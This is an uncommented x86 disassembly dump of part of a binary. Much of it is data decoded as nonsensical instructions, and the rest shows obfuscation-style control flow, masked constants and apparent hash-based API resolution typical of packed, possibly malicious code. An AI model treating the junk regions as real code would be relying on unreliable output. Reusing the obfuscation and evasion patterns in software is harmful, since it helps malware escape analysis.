  407dbb:	sub    al,BYTE PTR [ecx+0x23229155]
  407dc1:	or     BYTE PTR [ebp+0x46],bl
  407dc4:	retf   0xbb83
  407dc7:	mov    bh,0xde
  407dc9:	(bad)  
  407dca:	dec    DWORD PTR [eiz*4-0x2059e462]
  407dd1:	push   ss
  407dd2:	sub    ebx,DWORD PTR [ebx+0x6c]
  407dd5:	mov    ebx,0x3fa0fd39
  407dda:	inc    edi
  407ddb:	cmc    
  407ddc:	loopne 0x407da3
  407dde:	fisubr WORD PTR [edx-0x31]
  407de1:	jge    0x407e0a
  407de3:	and    cl,BYTE PTR ds:0x33dcbae9
  407de9:	push   ebp
  407dea:	mov    dl,cl
  407dec:	mov    edi,0x617297ea
  407df1:	or     cl,al
  407df3:	inc    esp
  407df4:	aas    
  407df5:	ja     0x407e1f
  407df7:	retf   0xf0a0
  407dfa:	jo     0x40b3362f
  407e00:	test   BYTE PTR [ecx-0x79],0x7c
  407e04:	(bad)  
  407e06:	(bad)  
  407e07:	aas    
  407e08:	jl     0x407daf
  407e0a:	and    edx,0xfffffffe
  407e0d:	pop    ds
  407e0e:	sbb    BYTE PTR [ecx],bh
  407e10:	push   es
  407e11:	daa    
  407e12:	enter  0x7fc6,0xc9
  407e16:	dec    ebp
  407e17:	inc    edx
  407e18:	in     al,0x27
  407e1a:	sub    bl,dh
  407e1c:	sub    esp,ecx
  407e1e:	fwait
  407e1f:	cmp    edi,edx
  407e21:	or     DWORD PTR [esi+0x7591abc3],0x10d574ea
  407e2b:	or     DWORD PTR [eax-0xd0c714c],ebx
  407e31:	aaa    
  407e32:	xchg   ecx,eax
  407e33:	cmp    BYTE PTR [ecx],ah
  407e35:	dec    eax
  407e36:	ret    0xa29a
  407e39:	daa    
  407e3a:	adc    ah,BYTE PTR [eax-0x1423f0d2]
  407e40:	jnp    0x407e65
  407e42:	push   ds
  407e43:	xchg   ecx,ecx
  407e45:	xchg   edi,eax
  407e46:	or     DWORD PTR [eax-0x8],0xe3e76619
  407e4d:	cmc    
  407e4e:	int3   
  407e4f:	mov    eax,0xf1c27184
  407e54:	jne    0x407ea3
  407e56:	push   edx
  407e57:	pusha  
  407e58:	mov    bh,0x98
  407e5a:	jns    0x407e93
  407e5c:	fldenv cs:[ecx]
  407e5f:	mov    esi,0xba893f3
  407e64:	inc    eax
  407e65:	push   es
  407e66:	fs jl  0x407edd
  407e69:	iret   
  407e6a:	sbb    DWORD PTR [esi+0x53],esp
  407e6d:	xor    DWORD PTR fs:[edi+0x15],eax
  407e71:	jns    0x407e2c
  407e73:	pop    edx
  407e74:	ss jmp 0x797c25ba
  407e7a:	dec    edi
  407e7b:	mov    bl,0x75
  407e7d:	push   edi
  407e7e:	les    ebp,FWORD PTR [ebx]
  407e80:	mov    eax,0x8db235f2
  407e85:	in     al,dx
  407e86:	out    dx,al
  407e87:	inc    ebx
  407e88:	sbb    dl,cl
  407e8a:	and    eax,0x6d2514e
  407e8f:	fs inc esp
  407e91:	jmp    0x407e66
  407e93:	mov    ebp,esp
  407e95:	rcl    bh,cl
  407e97:	sti    
  407e98:	addr16 push es
  407e9a:	mul    DWORD PTR [ecx]
  407e9c:	inc    ebx
  407e9d:	out    0x24,eax
  407e9f:	and    cl,BYTE PTR [ebp+0x3d]
  407ea2:	pushf  
  407ea3:	xor    ch,BYTE PTR [eax]
  407ea5:	mov    es,WORD PTR [ebx-0x45]
  407ea8:	popa   
  407ea9:	lahf   
  407eaa:	sahf   
  407eab:	mov    ?,WORD PTR ds:0xaa39aa9a
  407eb1:	push   esi
  407eb2:	addr16 sub eax,0x3081ec08
  407eb8:	(bad)  
  407eb9:	cli    
  407eba:	push   eax
  407ebb:	es jmp 0x407c05
  407ec1:	mov    ax,WORD PTR [ebp-0x4]
  407ec5:	mov    edi,DWORD PTR [ebp+0x8]
  407ec8:	mov    edi,DWORD PTR [edi]
  407eca:	mov    edx,0x8a42
  407ecf:	xor    ax,dx
  407ed2:	mov    edx,0x3b08
  407ed7:	add    ax,dx
  407eda:	cmp    ax,WORD PTR [edi]
  407edd:	je     0x408061
  407ee3:	mov    eax,DWORD PTR [ebp-0x14]
  407ee6:	xor    eax,ecx
  407ee8:	jmp    0x40801f
  407eed:	(bad)  
  407eee:	pop    edx
  407eef:	fst    st(3)
  407ef1:	jge    0x407f46
  407ef3:	out    0x5d,al
  407ef5:	jnp    0x407ee7
  407ef7:	inc    esi
  407ef8:	sub    DWORD PTR [eax+ebp*2-0x3722469c],edi
  407eff:	jl     0x407f7d
  407f01:	push   es
  407f02:	jg     0x407f80
  407f04:	jl     0x407eed
  407f06:	scas   eax,DWORD PTR es:[edi]
  407f07:	cmova  edx,DWORD PTR [edx]
  407f0a:	push   edx
  407f0b:	lods   eax,DWORD PTR ds:[esi]
  407f0c:	cmp    edx,DWORD PTR [eax+0x2]
  407f0f:	push   edx
  407f10:	push   ebx
  407f11:	aaa    
  407f12:	cmp    eax,0x61502e50
  407f17:	call   0xe5bc4dde
  407f1c:	test   eax,0x90fd07f6
  407f21:	pop    esp
  407f22:	sbb    BYTE PTR [ebx],0xfb
  407f25:	out    0xb7,al
  407f27:	xchg   DWORD PTR [eax],ebp
  407f29:	in     eax,0xc0
  407f2b:	int3   
  407f2c:	inc    edi
  407f2d:	jno    0x407f04
  407f2f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407f31:	cwde   
  407f32:	inc    edx
  407f33:	repz mov esp,0x3316d6a3
  407f39:	call   DWORD PTR [edx]
  407f3b:	pop    ds
  407f3c:	cmp    ah,BYTE PTR [esi-0x13ad81b3]
  407f42:	adc    BYTE PTR [esi],ch
  407f44:	fwait
  407f45:	hlt    
  407f46:	sub    DWORD PTR [edi+0x4d],ecx
  407f49:	fwait
  407f4a:	add    eax,0x5c4e139
  407f4f:	mov    ds:0x93b600c6,al
  407f54:	dec    edx
  407f55:	jo     0x407fb8
  407f57:	inc    edx
  407f58:	jmp    0x407f37
  407f5a:	pop    ecx
  407f5b:	mov    dl,0xdf
  407f5d:	mov    ah,0x92
  407f5f:	fwait
  407f60:	and    al,ch
  407f62:	les    ebp,FWORD PTR [esi]
  407f64:	jg     0x407eef
  407f66:	test   ebx,esi
  407f68:	out    dx,al
  407f69:	pop    ebp
  407f6a:	pop    ebx
  407f6b:	bound  esp,QWORD PTR [edi]
  407f6d:	dec    ebp
  407f6e:	adc    esi,DWORD PTR [esi]
  407f70:	sbb    ah,cl
  407f72:	inc    ecx
  407f73:	pushf  
  407f74:	arpl   WORD PTR cs:[ecx+0x22157a56],sp
  407f7b:	mov    DWORD PTR [edi],edi
  407f7d:	push   edx
  407f7e:	loop   0x407f4a
  407f80:	lods   eax,DWORD PTR ds:[esi]
  407f81:	sub    esi,ebp
  407f83:	mov    ds:0xc17e9a54,eax
  407f88:	fsubp  st(7),st
  407f8a:	and    BYTE PTR cs:[ebx-0x30320446],0xed
  407f92:	jg     0x407f4f
  407f94:	jg     0x407fa7
  407f96:	in     eax,dx
  407f97:	dec    ebp
  407f98:	fwait
  407f99:	xor    edx,ecx
  407f9b:	jno    0x407f35
  407f9d:	out    0x5f,al
  407f9f:	jle    0x407f86
  407fa1:	jnp    0x407fe8
  407fa3:	pop    ecx
  407fa4:	fisubr WORD PTR [ebp-0x72137263]
  407faa:	xor    ecx,0xcb293ec6
  407fb0:	pop    edi
  407fb1:	inc    eax
  407fb2:	mov    WORD PTR [edi+edx*1],es
  407fb5:	xlat   BYTE PTR ds:[ebx]
  407fb6:	popa   
  407fb7:	jle    0x407fa3
  407fb9:	pop    ss
  407fba:	sbb    DWORD PTR [ecx-0x6c],eax
  407fbd:	dec    esp
  407fbe:	push   edi
  407fbf:	and    eax,0xebac153e
  407fc4:	xchg   esi,eax
  407fc5:	sbb    al,0xf0
  407fc7:	mov    eax,0xeb2f67bc
  407fcc:	mov    edi,0xc6c4b2ce
  407fd1:	sbb    BYTE PTR [ecx],ch
  407fd3:	cmp    bh,BYTE PTR [eax]
  407fd5:	adc    ebp,DWORD PTR [ebx+eiz*8]
  407fd8:	pop    ss
  407fd9:	lds    edx,FWORD PTR [ecx-0x5286bcb8]
  407fdf:	pop    es
  407fe0:	pop    edx
  407fe1:	fist   WORD PTR [ebx+0x11c11172]
  407fe7:	mov    al,ds:0x41f9ba72
  407fec:	dec    edx
  407fed:	icebp  
  407fee:	aas    
  407fef:	int3   
  407ff0:	mov    WORD PTR [ecx],?
  407ff2:	adc    ecx,DWORD PTR [edx]
  407ff4:	jmp    0x407f9a
  407ff6:	and    DWORD PTR [esi],edx
  407ff8:	cmp    al,0xb5
  407ffa:	mov    dl,0xdc
  407ffc:	dec    edi
  407ffd:	mov    ds:0xeef3bf9b,eax
  408003:	or     eax,0xd0688c79
  408008:	idiv   DWORD PTR ds:0x8289b9eb
  40800e:	cmc    
  40800f:	je     0x40807c
  408011:	mov    bh,0x8b
  408013:	arpl   bx,cx
  408015:	sub    al,0x80
  408017:	fcmovnu st,st(5)
  408019:	push   ss
  40801a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40801b:	fcomp  QWORD PTR [esi]
  40801d:	jl     0x40808b
  40801f:	add    eax,esi
  408021:	mov    DWORD PTR [ebp-0x24],eax
  408024:	mov    eax,DWORD PTR [ebp-0x28]
  408027:	mov    di,WORD PTR [ebp-0x2c]
  40802b:	mov    ebx,0x8a42
  408030:	xor    di,bx
  408033:	add    di,dx
  408036:	movzx  edx,di
  408039:	mov    edi,DWORD PTR [ebp-0x8]
  40803c:	xor    edi,ecx
  40803e:	lea    edx,[edx+edi*1+0x32729e]
  408045:	add    DWORD PTR [eax],edx
  408047:	mov    eax,DWORD PTR [ebp-0x20]
  40804a:	mov    edx,DWORD PTR [ebp-0x8]
  40804d:	mov    edi,DWORD PTR [ebp-0x24]
  408050:	xor    edx,ecx
  408052:	add    edx,esi
  408054:	imul   edx,edi
  408057:	sub    DWORD PTR [eax],edx
  408059:	mov    eax,DWORD PTR [ebp-0x14]
  40805c:	jmp    0x407c08
  408061:	mov    eax,DWORD PTR [ebp-0xc]
  408064:	mov    edx,DWORD PTR [ebp-0x18]
  408067:	xor    eax,edx
  408069:	cmp    eax,0xe77c698d
  40806e:	je     0x407c05
  408074:	mov    eax,DWORD PTR [ebp-0x10]
  408077:	add    DWORD PTR [eax],0x7403501
  40807d:	jmp    0x407c05
  408082:	mov    eax,DWORD PTR [ebp-0x1c]
  408085:	cmp    DWORD PTR [eax],edi
  408087:	je     0x407c05
  40808d:	mov    eax,0x800f1c9c
  408092:	jmp    0x407c0c
  408097:	push   ebp
  408098:	mov    ebp,esp
  40809a:	push   ecx
  40809b:	xor    eax,eax
  40809d:	push   ecx
  40809e:	mov    DWORD PTR [ebp-0x8],0xf89c8535
  4080a5:	sub    edx,0x2ef1
  4080ab:	mov    DWORD PTR [ebp-0x4],0xf89c8534
  4080b2:	xor    ecx,ecx
  4080b4:	or     ecx,DWORD PTR ds:0x445378
  4080ba:	sbb    ecx,DWORD PTR ds:0x4105d3
  4080c0:	mov    DWORD PTR ds:0x445378,ecx
  4080c6:	mov    eax,DWORD PTR [ebp-0x4]
  4080c9:	dec    DWORD PTR ds:0x4105d3
  4080cf:	push   esi
  4080d0:	add    DWORD PTR ds:0x4427a4,0x9cd
  4080da:	mov    esi,DWORD PTR [ebp-0x8]
  4080dd:	xor    ecx,0x7d4d
  4080e3:	mov    edx,0x7510857
  4080e8:	xor    eax,edx
  4080ea:	adc    DWORD PTR ds:0x413412,0x7d5d
  4080f4:	xor    esi,edx
  4080f6:	and    DWORD PTR ds:0x445368,0x0
  408100:	mov    ecx,DWORD PTR ds:0x445368
  408106:	inc    ecx
  408107:	mov    DWORD PTR ds:0x445368,ecx
  40810d:	cmp    DWORD PTR ds:0x445368,0x1b
  408114:	jne    0x408125
  40811a:	push   0x4106c5
  40811f:	call   DWORD PTR ds:0x43c858
  408125:	cmp    DWORD PTR ds:0x445368,0x13
  40812c:	jb     0x408100
  408132:	mov    ecx,0x32729e
  408137:	add    esi,ecx
  408139:	jmp    0x4081e2
  40813e:	xchg   esp,eax
  40813f:	and    al,ch
  408141:	and    al,0x5d
  408143:	out    0x6d,eax
  408145:	mov    ds:0x3d17a190,al
  40814a:	stc    
  40814b:	and    al,BYTE PTR [eax+0x1c]
  40814e:	out    0xcb,eax
  408150:	jl     0x4081ce
  408152:	mov    BYTE PTR [esp+edi*2+0x7c],bh
  408156:	or     al,0xb
  408158:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408159:	cwde   
  40815a:	add    eax,0x51093f1c
  40815f:	stos   BYTE PTR es:[edi],al
  408160:	jns    0x40810f
  408162:	hlt    
  408163:	shl    DWORD PTR [eax+0x8],cl
  408166:	ja     0x408195
  408168:	int    0xa5
  40816a:	jp     0x40816d
  40816c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40816d:	retf   0xeee4
  408170:	pop    ebp
  408171:	test   edi,esp
  408173:	call   0x3b6b703
  408178:	lods   al,BYTE PTR ds:[esi]
  408179:	xchg   ecx,eax
  40817a:	mov    dl,0xd8
  40817c:	test   al,0xd9
  40817e:	popf   
  40817f:	aam    0x49
  408181:	stc    
  408182:	mov    eax,0x3f56c259
  408187:	lods   eax,DWORD PTR ds:[esi]
  408188:	(bad)  
  408189:	cmp    al,0x1e
  40818b:	cmp    ebx,DWORD PTR [esi+0x68e694af]
  408191:	ds call 0xae2f:0x16ff1d44
  408199:	inc    edx
  40819a:	jb     0x408142
  40819c:	adc    BYTE PTR [ebp-0x66],dh
  40819f:	(bad)  
  4081a0:	mov    ah,0x38
  4081a2:	inc    ebp
  4081a3:	or     BYTE PTR [edx],bh
  4081a5:	cdq    
  4081a6:	sbb    al,BYTE PTR [ecx+0x5d]
  4081a9:	hlt    
  4081aa:	xchg   ebp,eax
  4081ab:	das    
  4081ac:	jecxz  0x4081ab
  4081ae:	xchg   edx,eax
  4081af:	mov    al,ds:0xe5be30d9
  4081b4:	in     eax,0x67
  4081b6:	rol    DWORD PTR [edx+0x4a800853],1
  4081bc:	xchg   ebx,eax
  4081bd:	lahf   
  4081be:	lds    ebx,FWORD PTR [edx-0x52b7d72e]
  4081c4:	pusha  
  4081c5:	aad    0xca
  4081c7:	sub    al,0x2d
  4081c9:	test   eax,0xa94c5f45
  4081ce:	nop
  4081cf:	adc    dl,BYTE PTR [ebp-0x7b69545e]
  4081d5:	sbb    eax,0xb67d4893
  4081da:	test   eax,0x4e1eee26
  4081df:	neg    BYTE PTR [ebp+0xfc1031b]
  4081e5:	scas   eax,DWORD PTR es:[edi]
  4081e6:	(bad)  
  4081e7:	mov    esi,DWORD PTR [ebp+0xc]
  4081ea:	mov    DWORD PTR ds:0x4427a8,0x538a
  4081f4:	cmp    esi,eax
  4081f6:	jne    0x40826b
  4081fc:	mov    DWORD PTR ds:0x4427ac,0x1c
  408206:	cmp    DWORD PTR ds:0x4427ac,0x0
  40820d:	je     0x408255
  408213:	cmp    DWORD PTR ds:0x4427ac,0xe
  40821a:	jne    0x408229
  408220:	push   DWORD PTR [ebp-0x14]
  408223:	call   DWORD PTR ds:0x43c4fc
  408229:	cmp    DWORD PTR ds:0x4427ac,0xf
  408230:	jne    0x408243
  408236:	mov    esi,DWORD PTR ds:0x4427ac
  40823c:	dec    esi
  40823d:	mov    DWORD PTR ds:0x4427ac,esi
  408243:	mov    esi,DWORD PTR ds:0x4427ac
  408249:	dec    esi
  40824a:	mov    DWORD PTR ds:0x4427ac,esi
  408250:	jmp    0x408206
  408255:	mov    eax,DWORD PTR [ebp-0x4]
  408258:	mov    esi,DWORD PTR [ebp-0x8]
  40825b:	xor    eax,edx
  40825d:	xor    esi,edx
  40825f:	add    eax,ecx
  408261:	add    esi,ecx
  408263:	imul   eax,esi
  408266:	jmp    0x40834f
  40826b:	mov    eax,DWORD PTR [ebp+0xc]
  40826e:	mov    eax,DWORD PTR [eax+0x78]
  408271:	mov    DWORD PTR [ebp+0xc],eax
  408274:	mov    eax,DWORD PTR [ebp-0x4]
  408277:	mov    esi,DWORD PTR [ebp-0x8]
  40827a:	xor    eax,edx
  40827c:	xor    esi,edx
  40827e:	jmp    0x408327
  408283:	mov    edi,0x6a6fd0cd
  408288:	jns    0x4082cd
  40828a:	std    
  40828b:	ficomp WORD PTR [ebx+0x10]
  40828e:	jo     0x4082ff
  408290:	test   DWORD PTR [ebx],edx
  408292:	in     eax,dx
  408293:	jae    0x40825f
  408295:	jl     0x408313
  408297:	mov    BYTE PTR [esp+edi*2+0x7c],bh
  40829b:	add    al,0x4b
  40829d:	inc    ebp
  40829e:	cmp    ax,0x297b
  4082a2:	and    ah,BYTE PTR [ebx]
  4082a4:	push   ebp
  4082a5:	jo     0x408294
  4082a7:	mov    WORD PTR [edx+0x3b],gs
  4082aa:	data16 cmc 
  4082ac:	cmp    BYTE PTR [ecx-0x59143080],bl
  4082b2:	mov    edx,0xf0eeb6ea
  4082b7:	call   0x6ebeb5bc
  4082bc:	in     eax,dx
  4082bd:	jmp    0xb966:0xae46dcc4
  4082c4:	push   es
  4082c5:	enter  0xb939,0xc8
  4082c9:	in     al,dx
  4082ca:	jb     0x408305
  4082cc:	outs   dx,BYTE PTR ds:[esi]
  4082cd:	aam    0xbe
  4082cf:	sub    BYTE PTR [ebp+0x18],dh
  4082d2:	bound  esp,QWORD PTR [edx+ebp*4+0x2e]
  4082d6:	inc    eax
  4082d7:	add    eax,0x790e87e9
  4082dc:	dec    ecx
  4082dd:	in     eax,0x74
  4082df:	sub    al,0x85
  4082e1:	call   0x158:0xd3fe1733
  4082e8:	repnz push ds
  4082ea:	cdq    
  4082eb:	retf   0xe522
  4082ee:	jnp    0x40833b
  4082f0:	mov    edi,0x236e4726
  4082f5:	xchg   esi,eax
  4082f6:	test   edi,ebp
  4082f8:	push   ss
  4082f9:	pop    edi
  4082fa:	jo     0x408336
  4082fc:	out    dx,eax
  4082fd:	pop    ss
  4082fe:	popa   
  4082ff:	mov    ch,0x96
  408301:	xchg   ecx,eax
  408302:	int3   
  408303:	mov    eax,0x39b7010b
  408308:	out    0xdc,al
  40830a:	push   ds
  40830b:	arpl   sp,bp
  40830d:	sbb    DWORD PTR [edi],0xec8918d6
  408313:	sahf   
  408314:	pop    ebp
  408315:	cli    
  408316:	nop
  408317:	clc    
  408318:	lods   al,BYTE PTR ds:[esi]
  408319:	pop    ebx
  40831a:	pusha  
  40831b:	and    ah,BYTE PTR [ebx+esi*8]
  40831e:	push   0xfffffff1
  408320:	rol    DWORD PTR [ecx],1
  408322:	daa    
  408323:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408324:	push   eax
  408325:	inc    ecx
  408326:	inc    eax
  408327:	add    eax,ecx
  408329:	add    esi,ecx
  40832b:	imul   eax,esi
  40832e:	mov    esi,DWORD PTR [ebp+0xc]
  408331:	cmp    esi,eax
  408333:	mov    eax,DWORD PTR [ebp-0x4]
  408336:	je     0x408258
  40833c:	xor    eax,edx
  40833e:	add    eax,ecx
  408340:	mov    ecx,DWORD PTR [ebp+0xc]
  408343:	imul   eax,ecx
  408346:	add    eax,DWORD PTR [ebp+0x8]
  408349:	mov    DWORD PTR [ebp+0xc],eax
  40834c:	mov    eax,DWORD PTR [ebp+0xc]
  40834f:	pop    esi
  408350:	leave  
  408351:	ret    0x8
  408354:	push   ebp
  408355:	mov    ebp,esp
  408357:	sub    esp,0xa0
  40835d:	push   0x43c2b8
  408362:	xor    DWORD PTR ds:0x445370,0x56f9
  40836c:	call   DWORD PTR ds:0x43c580
  408372:	adc    DWORD PTR ds:0x43fbd8,0x41341e
  40837c:	test   eax,eax
  40837e:	mov    DWORD PTR ds:0x43fbdc,0xdf5
  408388:	je     0x40839f
  40838e:	or     DWORD PTR ds:0x4427bc,0x43fbe8
  408398:	xor    eax,eax
  40839a:	jmp    0x409294
  40839f:	sub    DWORD PTR ds:0x4427b4,0x43fbf4
  4083a9:	push   esi
  4083aa:	and    DWORD PTR ds:0x41341e,0x0
  4083b4:	jmp    0x4083c6
  4083b9:	mov    esi,DWORD PTR ds:0x41341e
  4083bf:	inc    esi
  4083c0:	mov    DWORD PTR ds:0x41341e,esi
  4083c6:	cmp    DWORD PTR ds:0x41341e,0x1f
  4083cd:	jae    0x408414
  4083d3:	cmp    DWORD PTR ds:0x41341e,0x9
  4083da:	jne    0x4083eb
  4083e0:	push   0x3309
  4083e5:	call   DWORD PTR ds:0x43c85c
  4083eb:	cmp    DWORD PTR ds:0x41341e,0x8
  4083f2:	jne    0x408405
  4083f8:	mov    esi,DWORD PTR ds:0x41341e
  4083fe:	inc    esi
  4083ff:	mov    DWORD PTR ds:0x41341e,esi
  408405:	jmp    0x4083b9
  40840a:	or     DWORD PTR ds:0x4427b8,0x7a7b
  408414:	mov    esi,0x876987
  408419:	mov    DWORD PTR ds:0x43fbe8,0x1efc
  408423:	push   esi
  408424:	push   0x43c2fc
  408429:	push   0x43c324
  40842e:	call   DWORD PTR ds:0x43c850
  408434:	mov    DWORD PTR ds:0x44537c,0x50e
  40843e:	cmp    eax,esi
  408440:	je     0x4084a1
  408446:	or     DWORD PTR ds:0x43fbd8,0x78e6
  408450:	push   0x98786856
  408455:	add    DWORD PTR ds:0x413416,0x6d32
  40845f:	push   0x344
  408464:	adc    DWORD PTR ds:0x4105cf,0x5b99
  40846e:	push   0x545
  408473:	adc    DWORD PTR ds:0x43fbf4,0x2d37
  40847d:	push   0x675765
  408482:	sbb    DWORD PTR ds:0x4105c3,0x41341e
  40848c:	push   0x67576
  408491:	push   0x86789768
  408496:	call   DWORD PTR ds:0x43c848
  40849c:	jmp    0x409293
  4084a1:	or     edx,0x6156
  4084a7:	mov    ecx,0xf89c8535
  4084ac:	and    esi,0x7fd
  4084b2:	mov    DWORD PTR [ebp-0x20],ecx
  4084b5:	sub    esi,0x48f6
  4084bb:	mov    DWORD PTR [ebp-0x18],0xf89c8534
  4084c2:	lea    eax,[ebp-0x4c]
  4084c5:	adc    DWORD PTR ds:0x44537c,ebx
  4084cb:	mov    DWORD PTR [ebp-0x30],eax
  4084ce:	add    esi,DWORD PTR ds:0x43fbf8
  4084d4:	lea    eax,[ebp-0x54]
  4084d7:	mov    DWORD PTR [ebp-0x14],eax
  4084da:	mov    DWORD PTR ds:0x43fbfc,0x12
  4084e4:	cmp    DWORD PTR ds:0x43fbfc,0x0
  4084eb:	je     0x40853a
  4084f1:	cmp    DWORD PTR ds:0x43fbfc,0x6
  4084f8:	jne    0x408509
  4084fe:	push   0x8a27
  408503:	call   DWORD PTR ds:0x43c860
  408509:	cmp    DWORD PTR ds:0x43fbfc,0x7
  408510:	jne    0x408521
  408516:	mov    eax,ds:0x43fbfc
  40851b:	dec    eax
  40851c:	mov    ds:0x43fbfc,eax
  408521:	xor    eax,eax
  408523:	xor    eax,DWORD PTR ds:0x43fbfc
  408529:	dec    eax
  40852a:	mov    ds:0x43fbfc,eax
  40852f:	jmp    0x4084e4
  408534:	sbb    esi,DWORD PTR ds:0x445370
  40853a:	mov    eax,ds:0x43c1a0
  40853f:	and    DWORD PTR ds:0x44536c,0x0
  408549:	jmp    0x40855b
  40854e:	mov    esi,DWORD PTR ds:0x44536c
  408554:	inc    esi
  408555:	mov    DWORD PTR ds:0x44536c,esi
  40855b:	cmp    DWORD PTR ds:0x44536c,0x16
  408562:	jae    0x4085a2
  408568:	cmp    DWORD PTR ds:0x44536c,0x1d
  40856f:	jne    0x40858a
  408575:	push   0x61c5
  40857a:	push   0x7b2c
  40857f:	push   0x2e55
  408584:	call   DWORD PTR ds:0x43c864
  40858a:	jmp    0x40854e
  40858f:	movzx  edx,WORD PTR ds:0x4427b8
  408596:	sbb    edx,DWORD PTR ds:0x41341a
  40859c:	mov    DWORD PTR ds:0x4427b8,edx
  4085a2:	mov    eax,DWORD PTR [eax+0x1c8]
  4085a8:	xor    edx,edx
  4085aa:	mov    eax,DWORD PTR [eax]
  4085ac:	mov    DWORD PTR ds:0x445380,0x299a
  4085b6:	mov    edx,DWORD PTR [ebp-0x14]
  4085b9:	and    DWORD PTR ds:0x44536c,0x0
  4085c3:	xor    esi,esi
  4085c5:	add    esi,DWORD PTR ds:0x44536c
  4085cb:	inc    esi
  4085cc:	mov    DWORD PTR ds:0x44536c,esi
  4085d2:	cmp    DWORD PTR ds:0x44536c,0x27
  4085d9:	jne    0x4085f1
  4085df:	push   0x7f38
  4085e4:	push   0x1
  4085e6:	push   0x41080d
  4085eb:	call   DWORD PTR ds:0x43c868
  4085f1:	cmp    DWORD PTR ds:0x44536c,0x1d
  4085f8:	jb     0x4085c3
  4085fe:	and    DWORD PTR ds:0x4427ac,0x0
  408608:	xor    esi,esi
  40860a:	add    esi,DWORD PTR ds:0x4427ac
  408610:	inc    esi
  408611:	mov    DWORD PTR ds:0x4427ac,esi
  408617:	cmp    DWORD PTR ds:0x4427ac,0xa
  40861e:	jne    0x40862f
  408624:	push   0x40b4
  408629:	call   DWORD PTR ds:0x43c5cc
  40862f:	cmp    DWORD PTR ds:0x4427ac,0x9
  408636:	jne    0x408649
  40863c:	mov    esi,DWORD PTR ds:0x4427ac
  408642:	inc    esi
  408643:	mov    DWORD PTR ds:0x4427ac,esi
  408649:	cmp    DWORD PTR ds:0x4427ac,0x1b
  408650:	jb     0x408608
  408656:	or     DWORD PTR ds:0x43fbf8,0x1250
  408660:	push   ebx
  408661:	movzx  esi,BYTE PTR ds:0x43fbe8
  408668:	sub    esi,DWORD PTR ds:0x413416
  40866e:	mov    DWORD PTR ds:0x43fbe8,esi
  408674:	mov    esi,0x7510857
  408679:	mov    DWORD PTR ds:0x413416,0x4f36
  408683:	xor    eax,esi
  408685:	sub    DWORD PTR ds:0x445364,0x4427c0
  40868f:	push   edi
  408690:	mov    DWORD PTR ds:0x43fbe8,0x1b
  40869a:	cmp    DWORD PTR ds:0x43fbe8,0x0
  4086a1:	je     0x408750
  4086a7:	cmp    DWORD PTR ds:0x43fbe8,0xd
  4086ae:	jne    0x4086c9
  4086b4:	push   0x7f5c
  4086b9:	push   0x1
  4086bb:	push   DWORD PTR [ebp-0x18]
  4086be:	push   0x52f7
  4086c3:	call   DWORD PTR ds:0x43c5d0
  4086c9:	cmp    DWORD PTR ds:0x43fbe8,0xe
  4086d0:	jne    0x4086e3
  4086d6:	mov    edi,DWORD PTR ds:0x43fbe8
  4086dc:	dec    edi
  4086dd:	mov    DWORD PTR ds:0x43fbe8,edi
  4086e3:	mov    edi,DWORD PTR ds:0x43fbe8
  4086e9:	dec    edi
  4086ea:	mov    DWORD PTR ds:0x43fbe8,edi
  4086f0:	jmp    0x40869a
  4086f5:	and    DWORD PTR ds:0x445380,0x0
  4086ff:	mov    edi,DWORD PTR ds:0x445380
  408705:	inc    edi
  408706:	mov    DWORD PTR ds:0x445380,edi
  40870c:	cmp    DWORD PTR ds:0x445380,0x9
  408713:	jne    0x408729
  408719:	push   0x3065
  40871e:	push   0x34da
  408723:	call   DWORD PTR ds:0x43c86c
  408729:	cmp    DWORD PTR ds:0x445380,0x8
  408730:	jne    0x408743
  408736:	mov    edi,DWORD PTR ds:0x445380
  40873c:	inc    edi
  40873d:	mov    DWORD PTR ds:0x445380,edi
  408743:	cmp    DWORD PTR ds:0x445380,0x12
  40874a:	jb     0x4086ff
  408750:	mov    edi,0x32729e
  408755:	sbb    DWORD PTR ds:0x44537c,0x4105d3
  40875f:	add    eax,edi
  408761:	mov    DWORD PTR [edx],eax
  408763:	movzx  eax,BYTE PTR ds:0x4427a4
  40876a:	mov    eax,ds:0x43c41c
  40876f:	cmp    eax,0x23d14057
  408774:	mov    DWORD PTR ds:0x41340e,0x37ed
  40877e:	mov    eax,DWORD PTR [ebp-0x18]
  408781:	mov    DWORD PTR ds:0x4427bc,0x441f
  40878b:	je     0x4087a5
  408791:	neg    ecx
  408793:	mov    ecx,DWORD PTR [ebp-0x20]
  408796:	xor    eax,esi
  408798:	add    eax,edi
  40879a:	imul   eax,ecx
  40879d:	mov    DWORD PTR [ebp-0x20],eax
  4087a0:	jmp    0x40903b
  4087a5:	xor    edx,DWORD PTR ds:0x4427a4
  4087ab:	xor    eax,esi
  4087ad:	add    eax,edi
  4087af:	and    DWORD PTR ds:0x43fbec,0x0
  4087b9:	mov    edx,DWORD PTR ds:0x43fbec
  4087bf:	inc    edx
  4087c0:	mov    DWORD PTR ds:0x43fbec,edx
  4087c6:	cmp    DWORD PTR ds:0x43fbec,0x1c
  4087cd:	jne    0x4087eb
  4087d3:	push   0x41080d
  4087d8:	push   0x5d39
  4087dd:	push   DWORD PTR [ebp-0x18]
  4087e0:	push   0x7a56
  4087e5:	call   DWORD PTR ds:0x43c870
  4087eb:	cmp    DWORD PTR ds:0x43fbec,0x11
  4087f2:	jb     0x4087b9
  4087f8:	mov    ds:0x43c2b0,eax
  4087fd:	mov    eax,DWORD PTR [ebp-0x20]
  408800:	xor    eax,esi
  408802:	inc    edx
  408803:	add    eax,edi
  408805:	movzx  edx,BYTE PTR ds:0x4427bc
  40880c:	sub    edx,DWORD PTR ds:0x43fbe4
  408812:	mov    DWORD PTR ds:0x4427bc,edx
  408818:	mov    ds:0x43c41c,eax
  40881d:	mov    eax,DWORD PTR [ebp-0x18]
  408820:	or     DWORD PTR ds:0x4105cb,0x6341
  40882a:	mov    edx,DWORD PTR ds:0x43c2b0
  408830:	sbb    DWORD PTR ds:0x43fbf4,0x4427c0
  40883a:	xor    eax,esi
  40883c:	sbb    DWORD PTR ds:0x4427ac,0x68
  408846:	add    eax,edi
  408848:	mov    DWORD PTR ds:0x4427b8,0x7dde
  408852:	cmp    edx,eax
  408854:	jne    0x40903b
  40885a:	mov    eax,DWORD PTR [ebp-0x18]
  40885d:	sbb    ebx,edx
